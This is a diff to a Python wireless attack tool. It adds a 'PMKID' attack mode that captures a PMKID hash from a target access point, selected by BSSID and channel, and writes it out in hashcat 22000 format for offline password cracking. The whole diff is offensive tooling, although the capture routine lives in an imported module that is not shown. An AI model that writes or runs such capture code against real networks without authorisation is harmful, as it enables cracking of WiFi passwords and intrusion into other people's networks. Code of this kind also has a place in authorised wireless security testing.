@@ -317,6 +317,27 @@ class ModuleSetup:
                     else:
                         debug("warn", f"Handshake failed: {res.error or 'unknown'}")
                     running = True
+                elif atkmode == "11" or atkmode.lower() == "pmkid":
+                    debug("info", "PMKID capture running")
+                    if channel is None:
+                        debug("critical", "PMKID requires a channel; aborting")
+                        return
+                    try:
+                        channel = int(channel)
+                    except (TypeError, ValueError):
+                        debug("critical", f"Invalid channel: {channel!r}")
+                        return
+
+                    from core.WIFI.pmkid_module import PmkidArgs
+
+                    res = AttackModule.pmkid(PmkidArgs(interface=self.interface, bssid=chosen_bssid, channel=channel, ssid=ssid, capture_timeout=60, output_path=f"{ssid}.hc22000",))
+                    if res.success and res.hashcat_line:
+                        debug("ok", f"PMKID: {res.hashcat_line}")
+                        if res.output_file:
+                            debug("info", f"Saved to {res.output_file}")
+                    else:
+                        debug("warn", f"PMKID failed: {res.error}")
+                    running = True
             except KeyboardInterrupt:
                 debug("info", "Attack interrupted")
             finally:
